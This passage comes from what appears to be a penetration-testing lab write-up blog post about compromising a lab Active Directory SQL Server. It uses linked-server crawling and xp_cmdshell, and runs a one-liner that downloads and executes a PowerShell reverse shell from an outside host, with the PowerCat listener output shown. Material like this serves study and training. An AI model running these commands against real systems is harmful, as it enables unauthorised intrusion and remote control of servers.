</span></span><span style="display:flex;"><span>SQLServerEdition : Developer Edition <span style="color:#ff79c6">(</span>64-bit<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SQLServerServicePack : RTM
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OSArchitecture : X64
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OsMachineType : ServerNT
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OSVersionName : Windows Server <span style="color:#bd93f9">2016</span> Standard
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OsVersionNumber : SQL
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>CurrentLogin : nebula<span style="color:#f1fa8c">\u</span>atadmin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>IsSysadmin : Yes
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ActiveSessions : <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt;  Get-SQLServerLinkCrawl -Instance devsrv.nebula.cosmos.local -Verbose
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: devsrv.nebula.cosmos.local : Connection Success.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: devsrv.nebula.cosmos.local : Connection Success.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: ------------------------------------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: Server: DEVSRV
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: ------------------------------------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: - Link Path to server: DEVSRV
</span></span></code></pre></div><p>luckily for me, i have sysadmin rights on this instance. meaning i can run OS commands, like <code>whoami</code> on the machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt;  Invoke-SQLOSCmd -Instance devsrv.nebula.cosmos.local -Command whoami
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ComputerName                 Instance                    CommandResults
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>------------                   --------                    ---------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>devsrv.nebula.cosmos.local   devsrv.nebula.cosmos.local  nebula<span style="color:#f1fa8c">\d</span>evsqladmin
</span></span></code></pre></div><p>i&rsquo;m now going to build a backdoor into this instance. to do this, i&rsquo;ll set up a PowerCat listener and use a PowerShell reverse shell script.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; Get-SQLServerLinkCrawl -Instance devsrv.Nebula.Cosmos.local -Query <span style="color:#f1fa8c">&#39;exec master..xp_cmdshell &#34;powershell iex (New-Object Net.WebClient).DownloadString(&#39;&#39;http://172.16.10.1/Invoke-PowerShellTCP-reverse.ps1&#39;&#39;)&#34;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; Invoke-SQLOSCmd -Instance devsrv.nebula.cosmos.local -Command <span style="color:#f1fa8c">&#34;powershell iex (New-Object Net.WebClient).DownloadString(&#39;http://172.16.10.1/Invoke-PowerShellTcp-reverse.ps1&#39;)&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ComputerName Instance CommandResults
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>------------ -------- --------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>devsrv.nebula.cosmos.local devsrv.nebula.cosmos.local
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt;  powercat -l -v -p <span style="color:#bd93f9">443</span> -t <span style="color:#bd93f9">555555</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: Set Stream 1: TCP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: Set Stream 2: Console
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: Setting up Stream 1...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: Listening on <span style="color:#ff79c6">[</span>0.0.0.0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>port 443<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: Connection from <span style="color:#ff79c6">[</span>172.16.3.31<span style="color:#ff79c6">]</span> port <span style="color:#ff79c6">[</span>tcp<span style="color:#ff79c6">]</span> accepted <span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">source</span> port 49718<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: Setting up Stream 2...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Windows PowerShell running as user devsqladmin on DEVSRV
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Copyright <span style="color:#ff79c6">(</span>C<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2015</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt; PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt; whoami
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nebula<span style="color:#f1fa8c">\d</span>evsqladmin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt;
</span></span></code></pre></div><p>the entire process is as follows:</p>
<p>exploit the SQL Server links to access other linked SQL Servers.</p>
<p>execute <code>xp_cmdshell</code>, which will allow me to execute OS commands.</p>
<p>download + execute a reverse shell script that will give me a reverse shell on <code>DEVSRV</code> as the <code>DEVSQLADMIN</code> user.</p>
<p>stay tuned for part 2, where i takeover the production server and domain controllers!</p>
</main>


    <br>
    <hr>
    
      Next: <a href="//localhost:1313/posts/new_post16/">goL0: reverse engineering &#43; malware analysis</a>
    




<footer>
  <div class="footer-nav">
    
    <a class="next" href="/posts/cosmos-2/" style="float: right"
      >next: cosmos, part 2: domain &#43; forest compromise</a
    >
     
    <a class="previous" href="/posts/new_post16/">previous</a>
    
  </div>
</footer>



<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now()
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener(
      "scroll",
      throttle(scrollCallback, 300),
    );
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    const codeBlocks = document.querySelectorAll('code[class^="language-"]');

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script>